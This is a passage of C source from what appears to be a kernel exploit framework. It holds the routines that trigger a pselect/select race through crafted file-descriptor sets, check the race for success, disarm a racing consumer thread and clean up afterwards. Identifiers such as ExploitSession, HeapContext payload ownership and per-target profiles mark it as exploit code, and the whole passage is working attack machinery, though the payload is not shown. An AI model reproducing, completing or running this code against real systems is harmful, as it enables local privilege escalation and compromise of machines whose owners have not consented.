  atomic_store(&context->race->consumer_calls, 0);
  atomic_store(&context->race->consumer_success, 0);
  atomic_store(&context->race->consumer_stop, 0);
  int delay_usec = route_delay_usec(context, 1);
  atomic_store(&context->race->route_delay_usec, delay_usec);
  atomic_store(&context->race->consumer_go, 1);

  pr_info("pselect pre-select compact=%d +%.0fms\n",
          context->layout.compact_waiter,
          fops_elapsed_ms(&route_t0));
  errno = 0;
  if (context->layout.compact_waiter) {
    uint32_t timeout_us = context->execution->select_timeout_us;
    struct timespec ts = {
      .tv_sec = timeout_us / 1000000,
      .tv_nsec = (long)(timeout_us % 1000000) * 1000,
    };
    context->select_result = pselect(
        PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
        &context->exception_set, &ts, NULL);
  } else {
    uint32_t timeout_us = context->execution->select_timeout_us;
    struct timeval timeout = {
      .tv_sec = timeout_us / 1000000,
      .tv_usec = timeout_us % 1000000,
    };
    context->select_result = select(
        PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
        &context->exception_set, &timeout);
  }
  context->select_errno = errno;
  restore_standard_io(context->stdio_backup);
  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
          context->layout.compact_waiter, fops_elapsed_ms(&route_t0),
          context->select_result);
  atomic_store(&context->race->consumer_go, 0);

  context->calls = atomic_load(&context->race->consumer_calls);
  context->successes = atomic_load(&context->race->consumer_success);
  if (context->calls > 0 && context->successes > 0) {
    context->status.code = ROUTE_OK;
    context->status.step = 0;
    context->status.error_number = 0;
    route_last_step = 0;
    route_last_errno = 0;
  } else {
    select_stack_fail(context, 33, context->select_errno);
  }
  return context->status;
}

static void select_stack_disarm(SelectStackRouteContext *context) {
  atomic_store(&context->race->consumer_go, 0);
  if (atomic_load(&context->race->consumer_inflight) != 0) {
    for (int i = 0;
         i < 2000 && atomic_load(&context->race->consumer_inflight) != 0;
         i++) {
      usleep(1000);
    }
    context->consumer_stuck =
        atomic_load(&context->race->consumer_inflight) != 0;
  }
  context->status.kernel_disarmed = !context->consumer_stuck;
}

static void select_stack_destroy(SelectStackRouteContext *context) {
  restore_standard_io(context->stdio_backup);
  if (context->consumer_stuck) {
    select_stack_fail(context, 34, context->select_errno);
    context->status.code = ROUTE_DIRTY_FAILURE;
    pr_error("pselect consumer still inflight; leaking route fds\n");
    return;
  }
  if (context->selected_fds_installed) {
    for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
      if (FD_ISSET(fd, &context->owned_input_set) ||
          FD_ISSET(fd, &context->owned_output_set) ||
          FD_ISSET(fd, &context->owned_exception_set)) {
        close(fd);
        if (context->block_fd == fd) context->block_fd = -1;
        if (context->pipe_fd[0] == fd) context->pipe_fd[0] = -1;
        if (context->pipe_fd[1] == fd) context->pipe_fd[1] = -1;
      }
    }
    context->selected_fds_installed = 0;
  }
  if (context->high_read_fd >= 0) close(context->high_read_fd);
  if (context->block_fd >= 0 && context->block_fd != context->pipe_fd[0]) {
    close(context->block_fd);
  }
  if (context->pipe_fd[0] >= 0) close(context->pipe_fd[0]);
  if (context->pipe_fd[1] >= 0) close(context->pipe_fd[1]);
  context->high_read_fd = context->block_fd = -1;
  context->pipe_fd[0] = context->pipe_fd[1] = -1;
  context->status.userspace_clean = 1;
  if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
    context->status.code = ROUTE_FALLBACK_SAFE;
  }
}

RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
  /* TODO(decoupling:S14-select-retry-controller): Compact outer retries must
   * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
   * Keep this route invocation single-shot until ExploitSession can create a
   * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
  SelectStackRouteContext context;
  select_stack_route_context_init(
      &context, &g_pi_race_context, request, execution_settings(),
      target_profile_select_stack_layout(&g_target_profile),
      standard_io_backup);
  route_last_step = route_last_errno = 0;

  if (select_stack_prepare(&context) == 0) {
    select_stack_execute(&context);
  }
  select_stack_disarm(&context);
  select_stack_destroy(&context);

  pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
          "step=%d errno=%d\n", context.calls, context.successes,
          context.status.code, context.status.userspace_clean,
          context.status.kernel_disarmed, context.status.step,
          context.status.error_number);
  return context.status;
}
